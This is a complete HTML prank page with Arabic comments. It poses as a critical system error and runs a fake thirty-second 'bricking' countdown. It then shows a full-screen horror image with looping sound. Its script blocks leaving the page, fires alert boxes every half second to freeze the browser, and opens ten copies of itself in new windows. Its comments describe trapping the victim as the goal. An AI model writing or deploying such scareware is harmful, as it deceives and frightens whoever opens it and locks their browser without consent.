<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>CRITICAL_SYSTEM_ERROR</title>
    <style>
        body, html { margin: 0; padding: 0; width: 100%; height: 100%; overflow: hidden; background-color: #000; font-family: monospace; cursor: none; }
        #terminal { position: relative; z-index: 10; height: 100vh; padding: 20px; color: #f00; text-align: center; display: flex; flex-direction: column; justify-content: center; }
        #countdown { font-size: 80px; color: #fff; text-shadow: 0 0 20px #f00; }
        #horrorImg { position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; object-fit: cover; z-index: 9999; display: none; }
    </style>
</head>
<body onclick="initVirus()">

    <div id="terminal">
        <div style="font-size: 20px; animation: blink 0.1s infinite;">⚠️ SYSTEM BREACH DETECTED ⚠️</div>
        <div id="countdown">30</div>
        <div style="color: #0ff;">> OVERRIDING_OS_FILES...<br>> STATUS: BRICKING_CORE...</div>
    </div>

    <img id="horrorImg" src="https://i.ibb.co/39snnynW/1000016067.jpg">
    
    <audio id="sfx" src="tfy-krk.mp3" preload="auto" loop></audio>

    <script>
        let seconds = 30;
        let active = false;

        // منع الخروج ومحاولة إغلاق الصفحة
        window.onbeforeunload = function() {
            return "⚠️ خطأ: لا يمكنك الخروج أثناء تدمير النظام.";
        };

        function initVirus() {
            if (active) return;
            active = true;
            document.documentElement.requestFullscreen().catch(() => {});

            let timer = setInterval(() => {
                seconds--;
                document.getElementById('countdown').innerText = seconds;
                if (seconds <= 0) {
                    clearInterval(timer);
                    launchScare();
                }
            }, 1000);
        }

        function launchScare() {
            document.getElementById('terminal').style.display = 'none';
            document.getElementById('horrorImg').style.display = 'block';
            document.getElementById('sfx').play(); // الصوت سيبقى يتكرر بفضل loop

            // ميزة "التعليق" اللانهائي (Infinite Loop Alert)
            // هذا الجزء يخلي المتصفح يتبلوكا وما يقدروش يخرجوا سواسوة
            setInterval(() => {
                alert("⚠️ FATAL ERROR: SYSTEM_32_DELETED");
                alert("طفي كراك.. النظام مات سواسوة!");
            }, 500);

            // محاولة فتح نوافذ جديدة لمنع الخروج
            for (let i = 0; i < 10; i++) {
                window.open(window.location.href, '_blank');
            }
        }
    </script>
</body>
</html>
